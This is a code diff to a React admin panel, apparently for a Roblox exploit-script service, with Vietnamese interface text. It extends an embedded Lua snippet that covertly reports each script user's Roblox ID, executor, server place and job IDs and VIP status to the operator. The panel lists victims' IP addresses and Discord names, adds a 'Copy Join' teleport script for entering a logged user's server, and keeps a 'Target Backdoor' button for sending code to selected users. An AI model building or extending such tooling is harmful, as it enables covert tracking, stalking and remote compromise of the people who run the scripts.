@@ -7,7 +7,7 @@ import {
   Copy, Check, ExternalLink, Upload, Eraser, Sliders, Gamepad2, Youtube, 
   MessageSquare, Loader2, Search, Eye, Download, LogOut, Terminal, Users, 
   Globe, UserCheck, RefreshCw, AlertOctagon, CopyPlus, Code2, Radio, Zap,
-  Skull, AlertTriangle, Send
+  Skull, AlertTriangle, Send, Server
 } from 'lucide-react';
 
 export default function AdminPage() {
@@ -28,6 +28,7 @@ export default function AdminPage() {
   const [logs, setLogs] = useState([]);
   const [logSearchQuery, setLogSearchQuery] = useState('');
   const [isLoadingLogs, setIsLoadingLogs] = useState(false);
+  const [copiedJoinId, setCopiedJoinId] = useState(null);
 
   const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); 
   const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
@@ -187,6 +188,7 @@ end)`;
 local HttpService = game:GetService("HttpService")
 local Player = game:GetService("Players").LocalPlayer
 local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+local isVipServer = (game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0)
 
 pcall(function()
     requestFunc({
@@ -198,7 +200,10 @@ pcall(function()
             roblox_id = tostring(Player.UserId),
             discord_user = "DiscordUser#0000",
             executor = identifyexecutor and identifyexecutor() or "Unknown Executor",
-            script_slug = "${selectedScript?.slug || 'main'}"
+            script_slug = "${selectedScript?.slug || 'main'}",
+            place_id = tostring(game.PlaceId),
+            job_id = tostring(game.JobId),
+            is_vip = isVipServer
         })
     })
 end)`;
@@ -214,6 +219,18 @@ end)`;
     navigator.clipboard.writeText(getBackdoorLuaSnippet());
     setCopiedBackdoorSnippet(true);
     setTimeout(() => setCopiedBackdoorSnippet(false), 2000);
+  };
+
+  const handleCopyJoinScript = async (log) => {
+    if (!log.place_id || !log.job_id) return;
+    const script = `game:GetService("TeleportService"):TeleportToPlaceInstance(${log.place_id}, "${log.job_id}", game.Players.LocalPlayer)`;
+    try {
+      await navigator.clipboard.writeText(script);
+      setCopiedJoinId(log.id);
+      setTimeout(() => setCopiedJoinId(null), 2000);
+    } catch (err) {
+      console.error('Lỗi copy script join:', err);
+    }
   };
 
   const handleSendBackdoor = async () => {
@@ -959,9 +976,9 @@ sound:Play()`);
               <thead className="bg-[#0c0f17] text-gray-400 font-extrabold border-b border-gray-800 uppercase text-[10px]">
                 <tr>
                   <th className="p-3.5">Tài Khoản Roblox</th>
+                  <th className="p-3.5">Loại Server</th>
                   <th className="p-3.5">IP Address</th>
-                  <th className="p-3.5">Discord User</th>
-                  <th className="p-3.5">Executor / Script</th>
+                  <th className="p-3.5">Discord / Executor</th>
                   <th className="p-3.5">Thời Gian Exec</th>
                   <th className="p-3.5">Hành Động</th>
                 </tr>
@@ -974,23 +991,72 @@ sound:Play()`);
                     </td>
                   </tr>
                 ) : (
-                  filteredLogs.map((log) => (
-                    <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
-                      <td className="p-3.5 font-sans font-bold text-white">{log.roblox_username} (ID: {log.roblox_id})</td>
-                      <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
-                      <td className="p-3.5 text-indigo-300 font-sans">{log.discord_user || 'Chưa liên kết'}</td>
-                      <td className="p-3.5 text-gray-300">{log.executor}</td>
-                      <td className="p-3.5 text-gray-400 text-[11px]">{new Date(log.created_at).toLocaleString('vi-VN')}</td>
-                      <td className="p-3.5">
-                        <button
-                          onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
-                          className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-all"
-                        >
-                          <Zap className="w-3 h-3" /> Target Backdoor
-                        </button>
-                      </td>
-                    </tr>
-                  ))
+                  filteredLogs.map((log) => {
+                    const isCopied = copiedJoinId === log.id;
+
+                    return (
+                      <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
+                        <td className="p-3.5 font-sans font-bold text-white">
+                          <div>{log.roblox_username}</div>
+                          <div className="text-[10px] text-gray-400 font-mono">ID: {log.roblox_id}</div>
+                        </td>
+
+                        {/* Tag Phân Biệt Server VIP hay Server Thường */}
+                        <td className="p-3.5">
+                          {log.is_vip ? (
+                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-purple-500/15 border border-purple-500/30 text-purple-400">
+                              <Lock className="w-3 h-3" /> Server VIP
+                            </span>
+                          ) : (
+                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
+                              <Globe className="w-3 h-3" /> Server Thường
+                            </span>
+                          )}
+                        </td>
+
+                        <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
+                        
+                        <td className="p-3.5 font-sans text-xs">
+                          <div className="text-indigo-300 font-bold">{log.discord_user || 'Chưa liên kết'}</div>
+                          <div className="text-gray-400 text-[10px] font-mono mt-0.5">{log.executor}</div>
+                        </td>
+
+                        <td className="p-3.5 text-gray-400 text-[11px]">
+                          {new Date(log.created_at).toLocaleString('vi-VN')}
+                        </td>
+
+                        {/* Các nút Hành Động */}
+                        <td className="p-3.5">
+                          <div className="flex items-center gap-2">
+                            {/* Nút Copy Join Server */}
+                            {log.place_id && log.job_id ? (
+                              <button
+                                onClick={() => handleCopyJoinScript(log)}
+                                className={`px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-all ${
+                                  isCopied
+                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
+                                    : 'bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 hover:bg-[#6E96FF] hover:text-black'
+                                }`}
+                              >
+                                {isCopied ? <Check className="w-3 h-3" /> : <Server className="w-3 h-3" />}
+                                {isCopied ? 'Đã Copy' : 'Copy Join'}
+                              </button>
+                            ) : (
+                              <span className="text-[10px] text-gray-500 italic font-mono">No JobId</span>
+                            )}
+
+                            {/* Nút Target Backdoor */}
+                            <button
+                              onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
+                              className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold flex items-center gap-1 cursor-pointer transition-all"
+                            >
+                              <Zap className="w-3 h-3" /> Target Backdoor
+                            </button>
+                          </div>
+                        </td>
+                      </tr>
+                    );
+                  })
                 )}
               </tbody>
             </table>
